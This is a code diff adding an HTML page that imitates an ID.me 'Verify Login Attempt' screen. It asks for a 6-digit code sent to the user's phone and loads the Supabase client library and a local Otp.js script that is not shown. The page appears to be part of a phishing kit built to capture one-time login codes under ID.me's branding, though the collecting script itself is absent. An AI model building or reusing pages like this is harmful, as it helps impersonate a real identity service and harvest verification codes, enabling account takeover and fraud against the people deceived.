@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify your login</title>
+    <link rel="stylesheet" href="assets/css/otp.css" />
+  </head>
+
+  <body>
+    <div class="header">
+      <img src="/assets/images/cdej9udhefuh0384hr8f04hti408thf80f984uyg97e.png" alt="" />
+    </div>
+    <div class="body-container">
+      <div class="body">
+        <div class="form-header">
+          <h1>Verify Login Attempt</h1>
+        </div>
+        <div class="email-img">
+          <img src="/assets/images/email.svg" role="img" alt="">
+        </div>
+        <div class="newID">
+          <p>We sent a verification code to your <strong>phone</strong>.</p>
+        </div>
+        <div class="form-fields">
+          <p class="info">Check your phone for a verfication code and type in the box below to continue
+            login</p>
+          <p class="info">If you do not receive one, do wait patiently, you would receive one in due time.</p>
+        </div>
+        <div class="separator">
+          <span></span>
+        </div>
+        <form action="#" class="token">
+          <div class="form-input">
+            <h2>Enter the 6-digit code sent to your phone</h2>
+          </div>
+          <div class="otp-code">
+            <label for="token">Confirmation Code</label>
+            <input type="text" id="token" title="token" placeholder="______" maxlength="6">
+          </div>
+          <div class="confirm">
+            <button id="otp-button" type="submit" class="submit-button" disabled>Confirm Code</button>
+          </div>
+        </form>
+        <footer class="footer">
+            <nav class="footer-links">
+              <ul class="footer-list">
+                <li class="footer-list-item active">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="What is ID.me? (opens in new tab)"
+                    aria-label="What is ID.me? (opens in new tab)"
+                    href="https://www.id.me/about"
+                    >What is ID.me?</a
+                  >
+                </li>
+                <span class="line">|</span>
+                <li class="footer-list-item active">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Terms of Service (opens in new tab)"
+                    aria-label="Terms of Service (opens in new tab)"
+                    href="https://www.id.me/terms"
+                    >Terms of Service</a
+                  >
+                </li>
+                <span class="line">|</span>
+                <li class="footer-list-item">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Privacy Policy (opens in new tab)"
+                    aria-label="Privacy Policy (opens in new tab)"
+                    href="https://www.id.me/privacy"
+                    >Privacy Policy</a
+                  >
+                </li>
+              </ul>
+            </nav>
+          </footer>
+      </div>
+      
+    </div>
+   
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script type="module" src="assets/js/Otp.js"></script>
+  </body>
+</html>
